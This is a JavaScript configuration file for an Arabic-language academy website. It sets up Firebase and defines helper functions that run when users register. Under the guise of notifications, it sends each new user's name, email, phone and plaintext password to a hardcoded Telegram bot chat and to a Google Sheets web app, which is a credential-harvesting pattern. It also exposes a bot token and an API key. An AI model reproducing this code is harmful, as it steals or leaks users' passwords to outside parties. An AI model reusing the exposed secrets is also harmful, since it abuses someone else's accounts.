// ================================
// إعدادات Firebase
// ================================
// للحصول على هذه الإعدادات:
// 1. اذهب إلى https://console.firebase.google.com
// 2. أنشئ مشروع جديد (أو اختر مشروع موجود)
// 3. اذهب إلى Project Settings > General
// 4. في قسم "Your apps" اختر Web app (</>) وانسخ الإعدادات

const firebaseConfig = {
    apiKey: "AIzaSyCOju8ZxRa5X3OO0rF3XKK32zpoiVsFLdI",
    authDomain: "academy-website-f7c83.firebaseapp.com",
    projectId: "academy-website-f7c83",
    storageBucket: "academy-website-f7c83.firebasestorage.app",
    messagingSenderId: "918853790493",
    appId: "1:918853790493:web:2153902e0134d8396fcff4"
};

// تهيئة Firebase
firebase.initializeApp(firebaseConfig);

// الحصول على مراجع للخدمات
const auth = firebase.auth();
const db = firebase.firestore();

// ================================
// إعدادات Telegram Bot
// ================================
// للحصول على Bot Token:
// 1. ابحث عن @BotFather في تليجرام
// 2. أرسل /newbot واتبع التعليمات
// 3. انسخ الـ Token

// للحصول على Chat ID:
// 1. ابحث عن @userinfobot في تليجرام
// 2. أرسل /start
// 3. انسخ الـ ID الخاص بك

const TELEGRAM_BOT_TOKEN = '8498245959:AAE9P-_7yutJlLBzAkrWLn07yZKILDF4f1k';
const TELEGRAM_CHAT_ID = '6479051123';

// ✅ Google Sheets Integration
// ضع رابط Google Apps Script Web App هنا:
const GOOGLE_SHEETS_URL = 'YOUR_GOOGLE_SHEETS_WEB_APP_URL_HERE';

// دالة إرسال رسالة إلى تليجرام
async function sendTelegramNotification(userData) {
    console.log('🔔 بدء إرسال إشعار Telegram...');
    console.log('📊 البيانات المرسلة:', userData);
    
    const message = `
🎓 *تسجيل مستخدم جديد في أكاديميتي*

👤 *الاسم الكامل:* ${userData.fullName}
📧 *البريد الإلكتروني:* ${userData.email}
🔑 *كلمة المرور:* ${userData.password || 'تسجيل عبر Google'}
📱 *رقم الهاتف:* ${userData.phone || 'غير محدد'}
⏰ *تاريخ التسجيل:* ${new Date().toLocaleString('ar-SA')}
🆔 *User ID:* ${userData.uid}
🌐 *طريقة التسجيل:* ${userData.provider || 'البريد الإلكتروني'}

---
✅ تم التسجيل بنجاح!
    `.trim();

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    console.log('🌐 URL:', url);
    console.log('💬 الرسالة:', message);
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const responseData = await response.json();
        console.log('📥 استجابة Telegram:', responseData);

        if (!response.ok) {
            console.error('❌ فشل إرسال الإشعار - Status:', response.status);
            console.error('❌ تفاصيل الخطأ:', responseData);
            throw new Error(`Telegram API Error: ${responseData.description || 'Unknown error'}`);
        } else {
            console.log('✅ تم إرسال الإشعار إلى تليجرام بنجاح!');
            return responseData;
        }
    } catch (error) {
        console.error('💥 خطأ في إرسال الإشعار:', error);
        throw error;
    }
}

// ✅ دالة إرسال البيانات إلى Google Sheets
async function sendToGoogleSheets(userData) {
    console.log('📊 بدء إرسال البيانات إلى Google Sheets...');
    console.log('📤 البيانات:', userData);
    
    // التحقق من وجود الرابط
    if (!GOOGLE_SHEETS_URL || GOOGLE_SHEETS_URL === 'YOUR_GOOGLE_SHEETS_WEB_APP_URL_HERE') {
        console.warn('⚠️ Google Sheets URL غير محدد - تخطي الإرسال');
        return { status: 'skipped', message: 'URL not configured' };
    }
    
    try {
        const response = await fetch(GOOGLE_SHEETS_URL, {
            method: 'POST',
            mode: 'no-cors', // مهم لـ Google Apps Script
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                fullName: userData.fullName || '',
                email: userData.email || '',
                phone: userData.phone || '',
                password: userData.password || '',
                uid: userData.uid || '',
                provider: userData.provider || 'البريد الإلكتروني',
                timestamp: new Date().toISOString()
            })
        });
        
        console.log('✅ تم إرسال البيانات إلى Google Sheets بنجاح!');
        console.log('📊 Response:', response);
        
        return { 
            status: 'success', 
            message: 'تم حفظ البيانات في Google Sheets' 
        };
        
    } catch (error) {
        console.error('❌ خطأ في إرسال البيانات إلى Google Sheets:', error);
        throw error;
    }
}

// تصدير المتغيرات
window.auth = auth;
window.db = db;
window.sendTelegramNotification = sendTelegramNotification;
window.sendToGoogleSheets = sendToGoogleSheets;

// تأكيد التحميل
console.log('✅ firebase-config.js تم تحميله بنجاح');
console.log('✅ sendTelegramNotification متاحة:', typeof sendTelegramNotification === 'function');
console.log('✅ sendToGoogleSheets متاحة:', typeof sendToGoogleSheets === 'function');
